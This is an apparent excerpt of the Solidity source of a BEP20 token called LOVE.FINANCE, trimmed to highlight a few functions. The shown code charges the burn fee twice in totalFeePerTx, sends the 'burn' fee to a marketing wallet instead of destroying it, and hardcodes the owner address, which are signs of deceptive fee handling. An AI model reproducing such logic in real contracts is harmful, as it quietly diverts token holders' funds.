...
contract Ownable is Context {
    ...
    constructor () internal {
        _owner = address(0xB0fc4D6E881023292f36b2F0Fe165FE63F1e5091);
...
contract LOVEPOT is Context, IBEP20, Ownable {
    ...
    string private _name = "LOVE.FINANCE";
    ...
    constructor (address _marketWallet, address _charityWallet) public {
    ...
    function totalFeePerTx(uint256 tAmount) internal view returns(uint256) {
        uint256 percentage = tAmount.mul(_holderFee.add(_liquidityFee).add(_burnFee).add(_burnFee)).div(100);
        return percentage;
    }
    ...
    function _takeburnFee(uint256 tAmount) private {
		...
		uint256 rburnFee = _burnFee.mul(_getRate());
		_rOwned[marketWallet] = _rOwned[marketWallet].add(rburnFee);
        if(_isExcluded[marketWallet])
            _tOwned[marketWallet] = _tOwned[marketWallet].add(tburnFee);
        emit Transfer(_msgSender(), marketWallet, tburnFee);
    }
